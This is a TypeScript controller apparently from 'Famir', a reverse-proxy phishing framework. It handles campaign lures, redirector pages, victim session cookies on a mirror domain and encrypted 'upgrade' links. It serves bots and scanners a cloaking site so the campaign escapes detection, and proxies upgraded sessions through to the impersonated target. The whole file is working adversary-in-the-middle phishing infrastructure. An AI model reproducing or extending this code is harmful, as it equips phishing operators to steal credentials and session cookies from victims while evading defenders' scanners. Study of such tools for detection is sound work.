import { decrypt, DIContainer, encrypt, randomName } from '@famir/common'
import {
  FullCampaignModel,
  FullRedirectorModel,
  RedirectorParams,
  SessionModel,
  UpgradeSessionParams,
} from '@famir/database'
import { HttpCookie } from '@famir/http-proto'
import { HTTP_SERVER_ROUTER, HttpServerContext, HttpServerRouter } from '@famir/http-server'
import { Logger, LOGGER } from '@famir/logger'
import { TEMPLATER, Templater } from '@famir/templater'
import { Validator, VALIDATOR } from '@famir/validator'
import { BaseController } from '../base/index.js'
import {
  AUTHORIZE_CONTROLLER,
  AUTHORIZE_SERVICE,
  AuthorizeDispatchAccessLevel,
  AuthorizeDispatchContextType,
} from './authorize.js'
import { authorizeSchemas } from './authorize.schemas.js'
import { type AuthorizeService } from './authorize.service.js'

/**
 * Represents an authorize controller
 *
 * @category Authorize
 */
export class AuthorizeController extends BaseController {
  /**
   * Register dependency
   */
  static register(container: DIContainer) {
    container.registerSingleton<AuthorizeController>(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new AuthorizeController(
          c.resolve(VALIDATOR),
          c.resolve(LOGGER),
          c.resolve(TEMPLATER),
          c.resolve(HTTP_SERVER_ROUTER),
          c.resolve(AUTHORIZE_SERVICE)
        )
    )
  }

  /**
   * Resolve dependency
   */
  static resolve(container: DIContainer): AuthorizeController {
    return container.resolve(AUTHORIZE_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    templater: Templater,
    router: HttpServerRouter,
    protected readonly authorizeService: AuthorizeService
  ) {
    super(validator, logger, templater, router)

    this.validator.addSchemas(authorizeSchemas)

    this.logger.debug(`AuthorizeController initialized`)
  }

  use() {
    this.router.addMiddleware('authorize', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      await this.dispatchRoot[ctx.type](ctx, campaign, target, next)
    })
  }

  private dispatchRoot: AuthorizeDispatchContextType = {
    normal: async (ctx, campaign, target, next) => {
      await this.dispatchNormal[target.accessLevel](ctx, campaign, target, next)
    },

    websocket: async (ctx, campaign, target, next) => {
      await this.dispatchWebSocket[target.accessLevel](ctx, campaign, target, next)
    },
  }

  private dispatchNormal: AuthorizeDispatchAccessLevel = {
    transparent: async (ctx, campaign, target, next) => {
      if (ctx.isBot) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      let session: SessionModel | null = null

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
        session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })
      }

      if (!session) {
        session = await this.authorizeService.createSession({
          campaignId: campaign.campaignId,
        })
      }

      this.persistSessionCookie(ctx, campaign, session)

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (ctx.state.verbose) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },

    landing: async (ctx, campaign, target, next) => {
      if (ctx.url.isPath(campaign.upgradeSessionPath)) {
        if (!ctx.method.is('GET')) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const upgradeSessionParams = this.parseUpgradeSessionParams(ctx, campaign)
        if (!upgradeSessionParams) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        if (ctx.isBot) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const okey = await this.authorizeService.upgradeSession({
          campaignId: campaign.campaignId,
          lureId: upgradeSessionParams.lure_id,
          sessionId: upgradeSessionParams.session_id,
          secret: upgradeSessionParams.secret,
        })

        if (!okey) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        await this.sendRedirectTo(ctx, upgradeSessionParams.back_url)

        return
      }

      const lure = await this.authorizeService.findLure({
        campaignId: campaign.campaignId,
        path: ctx.url.get('pathname'),
      })

      if (lure) {
        if (!ctx.method.is(['GET', 'HEAD'])) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const redirector = await this.authorizeService.readRedirector({
          campaignId: campaign.campaignId,
          redirectorId: lure.redirectorId,
        })

        const redirectorParams = this.parseRedirectorParams(ctx, campaign, redirector)
        if (!redirectorParams) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        if (ctx.isBot) {
          await this.sendRedirectorPage(ctx, target, redirector, {
            ...redirectorParams,
            upgrade_url: null,
          })

          return
        }

        const sessionCookie = this.getSessionCookie(ctx, campaign)
        if (!sessionCookie) {
          const session = await this.authorizeService.createSession({
            campaignId: campaign.campaignId,
          })

          this.persistSessionCookie(ctx, campaign, session)

          await this.sendOriginRedirect(ctx)

          return
        }

        if (!this.checkSessionCookie(sessionCookie)) {
          this.removeSessionCookie(ctx, campaign)

          await this.sendOriginRedirect(ctx)

          return
        }

        const session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })

        if (!session) {
          this.removeSessionCookie(ctx, campaign)

          await this.sendOriginRedirect(ctx)

          return
        }

        this.persistSessionCookie(ctx, campaign, session)

        const upgradeSessionParams: UpgradeSessionParams = {
          lure_id: lure.lureId,
          session_id: session.sessionId,
          secret: session.secret,
          back_url: redirectorParams['back_url'] ?? '/',
        }

        const upgrade_url = [
          campaign.upgradeSessionPath,
          '?',
          randomName(),
          '=',
          encrypt(JSON.stringify(upgradeSessionParams), campaign.cryptSecret),
        ].join('')

        await this.sendRedirectorPage(ctx, target, redirector, {
          ...redirectorParams,
          upgrade_url,
        })

        return
      }

      if (ctx.isBot) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (!sessionCookie) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      if (!this.checkSessionCookie(sessionCookie)) {
        this.removeSessionCookie(ctx, campaign)

        await this.sendOriginRedirect(ctx)

        return
      }

      const session = await this.authorizeService.authSession({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie,
      })

      if (!session) {
        this.removeSessionCookie(ctx, campaign)

        await this.sendOriginRedirect(ctx)

        return
      }

      this.persistSessionCookie(ctx, campaign, session)

      if (!session.isUpgraded) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (ctx.state.verbose) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },
  }

  private dispatchWebSocket: AuthorizeDispatchAccessLevel = {
    transparent: async (ctx, campaign, target, next) => {
      if (ctx.isBot) {
        ctx.close()

        return
      }

      let session: SessionModel | null = null

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
        session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })
      }

      if (!session) {
        session = await this.authorizeService.createSession({
          campaignId: campaign.campaignId,
        })
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      await next()
    },

    landing: async (ctx, campaign, target, next) => {
      if (ctx.isBot) {
        ctx.close()

        return
      }

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (!sessionCookie || !this.checkSessionCookie(sessionCookie)) {
        ctx.close()

        return
      }

      const session = await this.authorizeService.authSession({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie,
      })

      if (!session || !session.isUpgraded) {
        ctx.close()

        return
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      await next()
    },
  }

  private getSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): HttpCookie | undefined {
    const cookies = ctx.requestHeaders.getCookies()

    return cookies ? cookies[campaign.sessionCookieName] : undefined
  }

  private checkSessionCookie(value: unknown): value is string {
    return this.validator.guardSchema<string>('reverse-authorize-session-cookie', value)
  }

  private persistSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    session: SessionModel
  ) {
    if (ctx.type !== 'normal') {
      throw new Error(`Only 'normal' context type allowed`)
    }

    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: session.sessionId,
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: Math.round(campaign.sessionExpire / 1000),
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
    if (ctx.type !== 'normal') {
      throw new Error(`Only 'normal' context type allowed`)
    }

    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: '',
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: 0,
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private parseUpgradeSessionParams(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): UpgradeSessionParams | null {
    try {
      const urlParams = ctx.url.getQueryString()
      const value = Object.values(urlParams)[0]

      if (!(value && typeof value === 'string')) {
        return null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<UpgradeSessionParams>(
        'reverse-authorize-upgrade-session-params',
        data
      )

      return data
    } catch {
      return null
    }
  }

  private parseRedirectorParams(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    redirector: FullRedirectorModel
  ): RedirectorParams | null {
    try {
      const urlParams = ctx.url.getQueryString()
      const value = Object.values(urlParams)[0]

      if (!(value && typeof value === 'string')) {
        return redirector.isLoose ? {} : null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<RedirectorParams>('reverse-authorize-redirector-params', data)

      return redirector.checkParams(data) ? data : null
    } catch {
      return null
    }
  }
}
